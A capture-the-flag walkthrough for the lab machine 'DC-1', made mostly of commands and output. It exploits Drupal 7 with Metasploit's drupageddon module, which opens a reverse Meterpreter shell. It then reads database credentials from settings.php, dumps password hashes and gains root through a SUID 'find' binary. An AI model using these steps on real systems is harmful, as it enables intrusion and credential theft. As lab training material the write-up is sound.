DC-1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Exploiting Drupal 7  with Metasploit
[+] Privilege Escalation with find

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.109
Host is up (0.00028s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42862/udp  status
|_  100024  1          50413/tcp  status
MAC Address: 08:00:27:AA:94:9F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


There is a Drupal 7 Installation present at port 80


Exploiting Drupal (Metasploit)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > use exploit/multi/http/drupal_drupageddon 
msf5 exploit(multi/http/drupal_drupageddon) > show options 

Module options (exploit/multi/http/drupal_drupageddon):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)


msf5 exploit(multi/http/drupal_drupageddon) > set rhosts 192.168.56.109
rhosts => 192.168.56.109
msf5 exploit(multi/http/drupal_drupageddon) > run

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Sending stage (38247 bytes) to 192.168.56.109
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.109:32819) at 2019-11-05 08:47:26 -0500

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting credentials for the database 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@DC-1:/var/www/sites/default$ cat settings.php
...snip...
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After connecting to the database we get the following credentials"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mysql> select name, pass from users;
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |
| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
+-------+---------------------------------------------------------+
3 rows in set (0.00 sec)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Searching for SUID files

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@DC-1:/var/www$ find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege escalation with find

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@DC-1:/var/www$ find / . -iname "G" -exec "/bin/sh" \;
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# whoami
root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


